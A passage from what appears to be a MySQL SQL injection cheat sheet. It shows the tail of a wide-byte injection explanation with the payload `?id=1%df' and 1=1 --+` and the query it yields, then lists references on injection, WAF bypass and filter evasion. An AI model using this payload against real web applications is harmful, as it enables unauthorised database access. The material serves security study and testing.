Therefore, by using the payload `?id=1%df' and 1=1 --+`, after PHP adds the backslash, the SQL query transforms into: `SELECT * FROM users WHERE id='1連' and 1=1 --+' LIMIT 0,1`. This altered query can be successfully injected, bypassing the intended SQL logic.


## References

- [[SQLi] Extracting data without knowing columns names - Ahmed Sultan - February 9, 2019](https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/)
- [A Scientific Notation Bug in MySQL left AWS WAF Clients Vulnerable to SQL Injection - Marc Olivier Bergeron - October 19, 2021](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/)
- [Alternative for Information_Schema.Tables in MySQL - Osanda Malith Jayathissa - February 3, 2017](https://osandamalith.com/2017/02/03/alternative-for-information_schema-tables-in-mysql/)
- [Ekoparty CTF 2016 (Web 100) - p4-team - October 26, 2016](https://github.com/p4-team/ctf/tree/master/2016-10-26-ekoparty/web_100)
- [Error Based Injection | NetSPI SQL Injection Wiki - NetSPI - February 15, 2021](https://sqlwiki.netspi.com/injectionTypes/errorBased)
- [How to Use SQL Calls to Secure Your Web Site - IPA ISEC - March 2010](https://www.ipa.go.jp/security/vuln/ps6vr70000011hc4-att/000017321.pdf)
- [MySQL Out of Band Hacking - Osanda Malith Jayathissa - February 23, 2018](https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf)
- [SQL injection - The oldschool way - 02 - Ahmed Sultan - January 1, 2025](https://www.youtube.com/watch?v=u91EdO1cDak)
- [SQL Truncation Attack - Rohit Shaw - June 29, 2014](https://resources.infosecinstitute.com/sql-truncation-attack/)
- [SQLi filter evasion cheat sheet (MySQL) - Johannes Dahse - December 4, 2010](https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/)
- [The SQL Injection Knowledge Base - Roberto Salgado - May 29, 2013](https://websec.ca/kb/sql_injection#MySQL_Default_Databases)
